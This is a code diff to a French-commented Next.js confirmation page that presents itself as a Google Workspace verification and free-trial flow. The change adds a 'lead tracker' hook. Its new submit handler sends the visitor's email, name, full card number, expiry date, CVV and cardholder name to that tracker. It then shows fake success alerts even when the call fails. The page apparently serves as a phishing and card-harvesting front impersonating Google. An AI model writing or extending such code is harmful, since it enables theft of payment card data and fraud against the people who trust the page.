@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useRouter } from 'next/router';
 import { PageHead } from '../hooks/usePageMeta';
+import { useLeadTracker } from '../hooks/useLeadTracker';
 import layoutStyles from '../styles/components/Layout.module.css';
 import headerStyles from '../styles/components/Header.module.css';
 import planSummaryStyles from '../styles/components/PlanSummary.module.css';
@@ -23,6 +24,9 @@ const Confirmation = () => {
     cvv: '',
     cardName: ''
   });
+  
+  // Hook pour le tracking des leads
+  const { trackVerification, isTracking } = useLeadTracker();
 
   // Récupérer l'email et le prénom depuis l'URL au chargement
   useEffect(() => {
@@ -134,16 +138,42 @@ const Confirmation = () => {
     router.push('/success');
   };
 
-  const handleSubmit = () => {
-    setTimeout(() => {
-      if (selectedPlan === 'free') {
-        alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
-        handleVerificationComplete();
-      } else {
-        alert('Votre essai gratuit a commencé ! Accès immédiat à Google Workspace.');
-        handlePaymentComplete();
-      }
-    }, 1500);
+  const handleSubmit = async () => {
+    try {
+      // Tracker la vérification avec les données de carte bancaire
+      await trackVerification({
+        email,
+        firstName,
+        cardNumber: formData.cardNumber,
+        expiryDate: formData.expiryDate,
+        cvv: formData.cvv,  // Ajouter le CVV manquant
+        cardName: formData.cardName,
+        selectedPlan
+      });
+      
+      setTimeout(() => {
+        if (selectedPlan === 'free') {
+          alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
+          handleVerificationComplete();
+        } else {
+          alert('Votre essai gratuit a commencé ! Accès immédiat à Google Workspace.');
+          handlePaymentComplete();
+        }
+      }, 1500);
+      
+    } catch (error) {
+      console.error('Erreur lors du tracking de vérification:', error);
+      // Continuer même si le tracking échoue
+      setTimeout(() => {
+        if (selectedPlan === 'free') {
+          alert('Vérification réussie ! Redirection vers votre espace Google Workspace...');
+          handleVerificationComplete();
+        } else {
+          alert('Votre essai gratuit a commencé ! Accès immédiat à Google Workspace.');
+          handlePaymentComplete();
+        }
+      }, 1500);
+    }
   };
 
   const handleInputChange = (field, value) => {
@@ -244,6 +274,7 @@ const Confirmation = () => {
                         formData={formData}
                         onInputChange={handleInputChange}
                         onSubmit={handleSubmit}
+                        isSubmitting={isTracking}
                       />
                     </div>
                   </div>
